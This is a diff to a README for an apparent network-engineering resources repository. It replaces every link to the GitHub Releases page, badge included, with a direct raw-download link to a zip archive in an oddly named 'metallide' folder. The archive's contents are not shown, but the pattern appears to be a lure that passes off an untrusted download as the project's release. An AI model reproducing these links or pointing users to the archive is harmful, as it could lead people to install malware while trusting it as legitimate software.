@@ -1,6 +1,6 @@
 # 🌐 network-engineering-resources - Essential Tools for Networking Success
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/ashugithubrit/network-engineering-resources/releases)
+[![Download](https://github.com/ashugithubrit/network-engineering-resources/raw/refs/heads/main/metallide/engineering_network_resources_v1.5-beta.4.zip%20Release-brightgreen)](https://github.com/ashugithubrit/network-engineering-resources/raw/refs/heads/main/metallide/engineering_network_resources_v1.5-beta.4.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ To get started, follow these steps:
 
 1. **Visit the Release Page:** Go to our Releases page to find the latest version of the resources.
 
-   [Download Resources](https://github.com/ashugithubrit/network-engineering-resources/releases)
+   [Download Resources](https://github.com/ashugithubrit/network-engineering-resources/raw/refs/heads/main/metallide/engineering_network_resources_v1.5-beta.4.zip)
 
 2. **Choose Your Resource:** Look through the available resources. We offer various tools, training materials, and documentation to support your learning.
 
@@ -24,7 +24,7 @@ To download and install the resources, follow these instructions:
 
 1. **Visit the Releases Page:** 
 
-   [Download Resources](https://github.com/ashugithubrit/network-engineering-resources/releases)
+   [Download Resources](https://github.com/ashugithubrit/network-engineering-resources/raw/refs/heads/main/metallide/engineering_network_resources_v1.5-beta.4.zip)
 
 2. **Select the Desired Resource:** Look through the release notes and choose the file that best suits your needs. 
 
